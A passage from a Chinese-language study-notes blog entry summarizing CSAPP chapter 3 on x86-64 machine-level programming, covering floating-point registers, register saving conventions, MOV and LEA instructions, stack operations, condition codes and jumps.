id="浮点代码">浮点代码</h3><p>每个<code>YMM</code>寄存器都是<code>256位(32字节)</code>。当对标量进行数据操作时，这些寄存器只保存浮点数，而且只使用低 32 位( float )或64位( double )。每个<code>XMM</code>都是对应<code>YMM</code>寄存器的低<code>128位</code>。</p><img src="https://s2.loli.net/2022/03/28/SuwnxEqUNmOXVZ5.png" style="zoom:80%;" /><p>对应浮点传送指令为：</p><img src="https://s2.loli.net/2022/03/28/eSp4zOG7QRuLPhr.png"  /><p>对应运算指令：</p><img src="https://s2.loli.net/2022/03/29/V1C3IRsOxLUG8th.png" alt="65.png" style="zoom:80%;" /><p>对应位级运算：</p><p><img src="https://s2.loli.net/2022/03/29/GevyfdTjLkrFlmV.png" alt=""></p><h2 id="第三章总结">第三章总结</h2><h3 id="程序的机器级表示-2">程序的机器级表示</h3><p>在调用一个函数时，寄存器可能会有重复使用的情况发生，因此需要在调用前对寄存器的值进行保存，这里保存策略分为两大类：<code>调用者保存</code>和<code>被调用者保存</code>：</p><img src="https://s2.loli.net/2022/04/01/qgvI4aymRTwJ6Hk.png" alt="67.png" style="zoom: 67%;" /><p>对应寄存器的保存方式如下：</p><img src="https://s2.loli.net/2022/04/01/guK9LbwJ1dfHAZE.png" style="zoom: 50%;" /><h3 id="基本类型与内存访问">基本类型与内存访问</h3><p><code>C语言</code>中对应的基本类型在汇编中的后缀表示：</p><p><img src="https://s2.loli.net/2022/04/01/GRMKwnsAVemhlWN.png" alt=""></p><p>一个指令包括<strong>操作码</strong>和<strong>操作数</strong>，同时部分操作码可能没有对应的操作数( 如：ret )，同时可能一个操作码对应的是多个操作数。而在操作数中包含着：<code>立即数</code>、<code>寄存器</code>、<code>内存引用 (一个寄存器加上了括号来表示)</code>。</p><p>对应的内存引用(一般数组会采用如下方式进行取址) ：</p><blockquote><p>内存访问，CPU支持将复杂的访存结果直接作为操作数，不需要先把地址进行计算出来在到内存进行读取</p></blockquote><p><img src="https://s2.loli.net/2022/04/01/3P1IQSZkhl7c5bG.png" alt=""></p><h3 id="指令">指令</h3><h4 id="寄存器与数据传送指令">寄存器与数据传送指令</h4><p>对于<code>MOV</code>指令有如下使用方式：</p><img src="https://s2.loli.net/2022/04/01/cAIu2YRhwPlUedn.png" style="zoom:67%;" /><p>特别的当源操作数是一个立即数时，该立即数只能是 32 位补码表示，同时程序会对这个立即数进行符号位扩展到<code>64</code>位( 32 -&gt; 64 )，将得到的 64 位数保存到寄存器。</p><blockquote><p>如果操作的立即数是 64 位呢？程序引入了一个新的指令<code>movabsq</code>，该指令的源操作数可以是任意64位立即数，但是目的操作数只能是寄存器。</p></blockquote><p><code>movl</code>的目的操作数是寄存器时，会把该寄存器上的高 4 字节设置为 0.</p><blockquote><p>任何位寄存器生成32位值的指令都会把该寄存器的高位部分设置为 0.</p></blockquote><p>当源操作数的数位小于目的操作数的时候，有对应的<code>mov</code>指令对其进行符号位扩展或者零扩展。</p><blockquote><p>零扩展指令：</p><p><img src="https://s2.loli.net/2022/04/01/Ubp31Mjcq2y4Qw6.png" alt=""></p><p>符号位扩展：</p><p><img src="https://s2.loli.net/2022/04/01/DqwEbg7syORmjY3.png" alt=""></p><p>同理于零扩展指令，<code>s</code>表示的是符号位扩展(sign的缩写)，最后面两个都是大小指示符(源操作数 - 目的操作数)。</p><p>同时存在一个<code>cltq</code>指令，其源操作数只能是<code>%eax</code>，目的操作数只能是<code>%rax</code>。</p></blockquote><h4 id="栈与数据传送指令">栈与数据传送指令</h4><p><code>%rdi</code>和<code>%rsi</code>一般用于保存传入的参数的第一位、第二位。</p><p><code>pushq  %rax</code>等价于<code>sub  $8, %rsp  +  movq %rax, (%rsp)</code>两条指令的组合<br><code>popq  %rbx</code>等价于<code>movq (%rsp), %rbx  +  addq $8, %rsp</code>两条指令的组合，但是对应原来栈上的<code>%rbx</code>的值仍然存在，知道下次<code>push</code>操作，此处保存的数值才会被覆盖。</p><h4 id="算术和逻辑运算指令">算术和逻辑运算指令</h4><p><code>leaq</code>可以加载一个有效的地址，其中<code>q</code>表示地址的长度，源操作数可以像内存引用一样，通过计算偏移量来进行把对应的有效的地址值保存到目的操作数，需要注意的是，其执行的操作并不是到对应的内存地址处读取数据，而是将这个有效的地址值进行保存到目的操作数。</p><p>同时<code>lea</code>指令也可以完成对应的算术运算：</p><img src="https://s2.loli.net/2022/04/01/xRrocLUPzlDw2VJ.png" style="zoom: 50%;" /><p>单操作数指令：</p><img src="https://s2.loli.net/2022/04/01/i4gw7rITGLEzvcm.png" style="zoom:50%;" /><p>移位操作指令：</p><img src="https://s2.loli.net/2022/04/01/wIdCmrc2BW63oyn.png" style="zoom:50%;" /><blockquote><p>对于移位量<code>k</code>可以是一个立即数，或者存放在寄存器<code>cl</code>中的数，对于移位指令，只允许以特定的寄存器<code>cl</code>作为操作数</p><p><code>cl</code>的长度为 8 个二进制位，意味着最多可以移位的长度位为 255 ，移位对应的数据时采用<code>cl</code>的不同低位来进行保存。</p></blockquote><p>对于此程序在进行乘法时，为什么不直接使用对应的乘法指令？这是因为在使用<code>lea</code>指令进行运算时所开销的时间周期更短，编译器会将程序进行优化，采用时间周期开销更短的进行编译。</p><h3 id="指令与条件码">指令与条件码</h3><p>执行一个指令时会用到相应的算术逻辑单元(ALU)，ALU重寄存器中读取数据后，执行相应的运算，并设置对应的条件码寄存器。</p><p>条件码寄存器由<code>CPU</code>进行维护长度为单个比特位，用于描述最近操作的属性。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">CF</span> - 进位标志 可以用来进行检测是否发生了正溢出<br><span class="hljs-attribute">ZF</span> - 零标志 记录最近的操作结果是否为 <span class="hljs-number">0</span> ，为 <span class="hljs-number">0</span> 则将其置为 <span class="hljs-number">1</span><br><span class="hljs-attribute">SF</span> - 符号标志 当最近的操作结果小于 <span class="hljs-number">0</span> 时，其会置为 <span class="hljs-number">1</span><br><span class="hljs-attribute">OF</span> - 溢出标志，针对有符号数，当发生溢出时便会置 <span class="hljs-number">1</span> (发生正/负溢出时)<br></code></pre></td></tr></table></figure><p><code>cmp</code>指令和<code>test</code>指令只是设置条件码寄存器，不更新目的寄存器的值。</p><p><img src="https://s2.loli.net/2022/03/08/rY3GajinI8bksZu.png" alt=""></p><p>一般程序不会直接对条件码寄存器进行访问，但程序可以通过<code>setx</code>来对条件码寄存器进行间接访问，保存对应的值于一个寄存器中，通过对应寄存器的值进行返回或者判断。(Bool类型)</p><p>对于大于和等于的情况可以直接通过相应的寄存器进行判断，而小于则需要<code>SF ^ OF</code>来进行判断，如不发生溢出时可以通过对应符号寄存器<code>SF</code>进行判断，但是发生溢出时就需要借助<code>OF</code>溢出标志进行判断。</p><h3 id="跳转指令与循环">跳转指令与循环</h3><img src="https://s2.loli.net/2022/03/09/OglYsqIVU8MiADB.png" style="zoom:67%;" /><p>在程序中，使用较多的条件判断语句会使程序的执行效率不高，因为程序通常会对每个分支用分支预测器进行判断每个分支是否会进行，当发生错误的预测时，会浪费较多的时间。程序因此会将其优化，将循环变成低级的测试和条件跳转的组合。</p>]]></content>
    
    
    <categories>
      
      <category>CSAPP</category>
      
    </categories>
    
    
  </entry>
  
  
  
  
</search>
